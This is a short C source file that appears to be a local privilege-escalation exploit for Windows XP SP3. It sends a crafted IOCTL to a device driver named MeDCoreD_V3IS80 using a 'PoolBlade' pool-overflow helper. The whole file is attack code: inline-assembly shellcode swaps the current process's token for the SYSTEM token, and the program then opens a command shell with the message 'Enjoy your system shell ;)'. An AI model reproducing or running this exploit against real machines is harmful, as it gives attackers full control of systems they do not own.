#include <Windows.h>

#include <stdio.h>
#include "PoolBlade.h"


//Offsets of Data structures WINXPSP3
#define _KPROCESS 0x44
#define _TOKEN 0xc8
#define _UPID 0x84
#define _APLINKS 0x88

VOID shellcode()
{
	__asm
	{
		push edx                        
		push ebx                        
		xor eax, eax                    
		mov eax, fs:[eax+124h]
		mov eax, [eax+_KPROCESS]    
		mov ecx, eax
		mov ebx, [eax+_TOKEN]   
L:		mov eax, [eax+_APLINKS] 
		sub eax,88h                     
		cmp [eax+_UPID], 4      
		jnz L
		mov edx,[eax+_TOKEN]    
		mov eax, ecx                    
		mov [eax+_TOKEN],edx    
		pop ebx                         
		pop edx                  
	}
}

int main()
{
	HANDLE handle = INVALID_HANDLE_VALUE;
	handle = CreateFileA("\\\\.\\MeDCoreD_V3IS80", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		NULL, OPEN_EXISTING,  FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 0);
	if (handle == INVALID_HANDLE_VALUE)
		return -1;
	else
	{			
		PoolBlade * pb = new PoolBlade(shellcode, 0x7d0);

		DWORD inSize = 0;
		BYTE * inbuffer = pb->AutoExploitInit(&inSize);

		char outbuffer[0x100];

		DWORD dwSz;		
		DeviceIoControl(handle, 0xA3350014, inbuffer, inSize, outbuffer, sizeof(outbuffer), &dwSz, NULL);
		pb->ExploitFinish();
		CloseHandle(handle);
	}
	printf("Enjoy your system shell ;)\n\n");
	WinExec("CMD", SW_SHOWNORMAL);
}